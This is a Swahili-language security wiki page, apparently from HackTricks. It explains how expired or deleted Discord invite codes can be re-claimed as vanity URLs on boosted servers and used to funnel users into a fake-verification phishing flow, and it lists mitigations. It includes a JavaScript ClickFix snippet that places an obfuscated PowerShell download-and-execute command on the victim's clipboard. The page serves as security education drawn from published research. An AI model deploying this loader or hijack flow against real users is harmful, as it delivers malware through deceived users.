# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Uthibitisho wa mfumo wa mwaliko wa Discord unaruhusu wahalifu kudai nambari za mwaliko zilizokwisha muda au kufutwa (za muda, za kudumu, au za kibinafsi) kama viungo vipya vya kibinafsi kwenye seva yoyote iliyoimarishwa kiwango cha 3. Kwa kupeleka nambari zote kwa herufi ndogo, washambuliaji wanaweza kujiandikisha mapema nambari za mwaliko zinazojulikana na kwa kimya kuhamasisha trafiki mara nambari ya asili inapokwisha muda au seva ya chanzo inapopoteza nguvu yake.

## Aina za Mwaliko na Hatari ya Kuiba

| Aina ya Mwaliko      | Inaweza Kuibwa? | Masharti / Maoni                                                                                          |
|-----------------------|------------------|-----------------------------------------------------------------------------------------------------------|
| Kiungo cha Mwaliko wa Muda | ✅               | Baada ya kuisha, nambari inapatikana na inaweza kujiandikisha tena kama URL ya kibinafsi na seva iliyoimarishwa. |
| Kiungo cha Mwaliko wa Kudumu | ⚠️               | Ikiwa imefutwa na inajumuisha herufi ndogo tu na nambari, nambari inaweza kupatikana tena.               |
| Kiungo cha Kibinafsi    | ✅               | Ikiwa seva ya asili inapoteza nguvu yake ya Kiwango cha 3, mwaliko wake wa kibinafsi unapatikana kwa usajili mpya. |

## Hatua za Kutumia

1. Upelelezi
- Fuata vyanzo vya umma (mifumo, mitandao ya kijamii, vituo vya Telegram) kwa viungo vya mwaliko vinavyolingana na muundo `discord.gg/{code}` au `discord.com/invite/{code}`.
- Kusanya nambari za mwaliko zinazovutia (za muda au za kibinafsi).
2. Usajili wa Mapema
- Unda au tumia seva ya Discord iliyopo yenye haki za Kiwango cha 3.
- Katika **Mipangilio ya Seva → URL ya Kibinafsi**, jaribu kupeana nambari ya mwaliko wa lengo. Ikiwa inakubaliwa, nambari hiyo inahifadhiwa na seva mbaya.
3. Kuanzisha Kuiba
- Kwa mwaliko wa muda, subiri hadi mwaliko wa asili uishe (au uifute kwa mikono ikiwa unadhibiti chanzo).
- Kwa nambari zinazojumuisha herufi kubwa, toleo la herufi ndogo linaweza kudaiwa mara moja, ingawa uelekezaji unaanza tu baada ya kuisha.
4. Uelekezaji wa Kimya
- Watumiaji wanaotembelea kiungo cha zamani wanapelekwa kwa seva inayodhibitiwa na mshambuliaji mara tu kuiba inapoanza.

## Mchakato wa Phishing kupitia Seva ya Discord

1. Punguza vituo vya seva ili tu kituo cha **#verify** kiwe visible.
2. Tumia bot (mfano, **Safeguard#0786**) kuhamasisha wapya kuthibitisha kupitia OAuth2.
3. Bot inaelekeza watumiaji kwenye tovuti ya phishing (mfano, `captchaguard.me`) chini ya kivuli cha hatua ya CAPTCHA au uthibitisho.
4. Tekeleza hila ya UX ya **ClickFix**:
- Onyesha ujumbe wa CAPTCHA ulioharibika.
- Elekeza watumiaji kufungua mazungumzo ya **Win+R**, kubandika amri ya PowerShell iliyopakiwa mapema, na kubonyeza Enter.

### Mfano wa Uingizaji wa ClickFix Clipboard
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Hii mbinu inakwepa upakuaji wa moja kwa moja wa faili na inatumia vipengele vya UI vinavyofahamika ili kupunguza mashaka ya mtumiaji.

## Mitigations

- Tumia viungo vya mwaliko vya kudumu vinavyokuwa na angalau herufi moja kubwa au alama isiyo ya nambari (visivyoweza kuisha, visivyoweza kutumika tena).
- Badilisha mara kwa mara misimbo ya mwaliko na kufuta viungo vya zamani.
- Fuata hali ya kuimarisha seva ya Discord na madai ya URL ya urembo.
- Wafundishe watumiaji kuthibitisha uhalali wa seva na kuepuka kutekeleza amri zilizopachikwa kwenye clipboard.

## References

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include /banners/hacktricks-training.md}}
